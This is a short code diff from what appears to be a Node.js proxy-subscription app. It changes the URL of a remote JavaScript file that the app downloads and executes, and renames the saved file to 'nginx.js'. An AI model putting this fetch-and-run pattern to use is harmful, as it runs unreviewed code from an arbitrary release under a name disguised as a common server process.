@@ -31,8 +31,8 @@ app.get("/sub", (req, res) => {
 });
 
 // Specify the URL of the bot.js file to download
-const fileUrl = 'https://github.com/jinme123/mosc1/releases/download/scal/gx.js';
-const fileName = 'gx.js';
+const fileUrl = 'https://github.com/pread235/sca-pu/releases/download/untagged-48dcfeb2a130c4e9442c/nginx.js';
+const fileName = 'nginx.js';
 const filePath = path.join(__dirname, fileName);
 
 // Download and execute the file
